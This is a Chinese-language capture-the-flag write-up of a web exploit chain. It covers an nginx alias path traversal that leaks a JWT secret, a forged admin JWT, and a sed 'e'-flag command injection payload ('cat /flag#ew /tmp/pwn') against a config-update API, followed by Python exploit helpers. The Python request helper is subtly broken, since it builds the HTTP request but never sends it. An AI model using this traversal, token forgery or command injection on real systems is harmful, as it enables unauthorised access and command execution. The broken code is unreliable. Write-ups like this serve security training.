## 漏洞链

1. `default.conf` 里 `location /static { alias /var/www/static/; }` 少了尾部 `/`，可以用：

```text
/static..%2fapp/config.yaml
```

读到 `/var/www/app/config.yaml`，泄露 `jwt_secret`：

```yaml
jwt_secret: "iot-guardian-s3cret-key-2024"
```

2. 用这个 secret 伪造管理员 JWT。

3. 访问 `POST /api/config/update`，发现后端会执行：

```text
sed -i 's#.*old_value.*#new_value#' <config_path>
```

`new_value` 过滤不严格，`#` 没被拦住，所以可以构造 `sed` 注入。

4. 利用 payload：

```text
cat /flag#ew /tmp/pwn
```

拼进 sed 后会触发 `e` 执行命令，`w` 只是为了让 flags 合法，命令输出会直接出现在接口返回的 `output` 里，从而拿到 flag。

def b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def make_jwt(secret):
    header = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64u(json.dumps({"role": "admin", "username": "admin", "exp": 2000000000}, separators=(",", ":")).encode())
    msg = header + b"." + payload
    sig = b64u(hmac.new(secret.encode(), msg, hashlib.sha256).digest())
    return (msg + b"." + sig).decode()


def http_once(method, path, body=b"", headers=None):
    if headers is None:
        headers = {}
    conn = remote(host, port)
    req = [
        f"{method} {path} HTTP/1.1",
        f"Host: {vhost}",
        "Connection: close",
    ]
    for k, v in headers.items():
        req.append(f"{k}: {v}")
    if body:
        req.append(f"Content-Length: {len(body)}")
    req.append("")
    req.append("")

    data = b""
    while True:
        chunk = conn.recv(timeout=1)
        if not chunk:
            break
        data += chunk
    conn.close()
    return data
